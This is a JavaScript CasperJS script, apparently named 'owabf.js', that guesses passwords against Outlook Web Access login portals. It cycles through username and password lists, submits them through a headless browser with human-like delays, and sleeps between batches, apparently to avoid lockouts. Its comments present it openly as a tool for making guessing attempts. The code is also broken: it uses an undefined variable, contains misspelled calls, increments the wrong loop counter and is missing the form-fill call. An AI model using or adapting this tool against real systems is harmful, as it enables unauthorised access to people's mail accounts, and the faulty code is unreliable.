// casper|phantom JS
// author: mp - heavily based on ry's work
// this requires casperjs and phantomjs to work sometimes OWA login portals are protected by 
// microsuck forefront to provide cookie auth.. something that is annoying to code for with
// any other language, so impersonate a browser and use that to make guessing attempts :)

var casper = require("casper").create({
    verbose      : true,
    logLevel     : "debug",
    pageSettings : {
        loadImages  : false,
        loadPlugins : false,
        javascriptEnabled: true
    },
    viewportSize : {
        width  : 800,
        height : 600
    }
});

var fs    = require("fs");
var utils = require("utils");

var width  = 1920;
var height = 1080;

var failed   = casper.cli.get("failed");
var form     = casper.cli.get("form");
var url      = casper.cli.get("url");
var title    = casper.cli.get("title");
var UA       = casper.cli.get("user-agent");
var userlist = casper.cli.get("userlist");
var passlist = casper.cli.get("passlist");
var attempts = casper.cli.get("attempts");
var sleep    = casper.cli.get("sleep");

if (!failed || !form || !url || !title || !UA || !userlist || !passlist || !attempts || !sleep || !button) {
    casper.echo("usage: casperjs owabf.js <args>");
    casper.echo("");
    casper.echo("    --failed     : failed string");
    casper.echo("    --form       : submission form");
    casper.echo("    --url        : location of OWA");
    casper.echo("    --title      : expected title");
    casper.echo("    --user-agent : useragent to use");
    casper.echo("    --userlist   : list of usernames or emails");
    casper.echo("    --passlist   : list of passwords");
    casper.echo("    --attempts   : number of attempts before sleeping");
    casper.echo("    --sleep      : how long to sleep for in minutes");
    casper.echo("    --button     : button to click");
    casper.exit(1);
}

// HTTP Response code handling
casper.on("resource.request", function(resource) {
    casper.echo("[GET] " + resource.url);
});

casper.on("resource.recieved", function(resource) {
    casper.echo("[RSP] " + resource.url);
});

casper.on("http.status.200", function(resource) {
    casper.echo("[200] " + resource.url + " OK");
});

casper.on("http.status.302", function(resource) {
    casper.echo( "[302] " + resource.url + " Redirect");
});

casper.on("http.status.500", function(resource) {
    capser.echo("[500] " + resource.url + " Internal Error");
});

casper.on("open", function(location) {
    this.echo(location);
});

var users   = fs.read(userlist);
var passwds = fs.read(passlist);
var count   = 0

casper.start();
casper.userAgent(UA);

if (users && passwds) {
    casper.echo("[+++] Targeting " + url);
    passlines = passwds.split("\n");
    for (var i = 0, len = passlines.length; i < len; i++) {
        userlines = users.split("\n");
        for (var j = 0, len = userlines.length; j < len; i++) {           
            if (this.exists(form)) {
                casper.echo("[>>>] Trying " + userlines[j] + ":" + passlines[i]);
                    user_name : userlines[j],
                    password  : passlines[i]
                }, false);
                // simulate a human with a slight delay before "clicking" submit
                this.wait(1000, function() {
                    this.click("login button");
                });
                casper.then(function() {
                    // wait for the page to load
                    this.wait(1000, function() {
                        if (this.getHTLM().indexOf(failed) == -1) {
                            this.echo("[+++] Successful login " + userlines[j] + ":" + passlines[i]);
                        } else {
                            this.echo("[!!!] Failed login " + userlines[j] + ":" + passlines[i]);
                        }
                    });
                });
            } else {
                this.echo("[!!!] Unable to find login form " + form)
                this.exit(1);
            }
        }
        count += 1;
        if (count % attempts == 0) {
            this.echo("[---] Sleeping for " + sleep + " minutes");
            this.wait( sleep * 60000 );
        }
    }
}
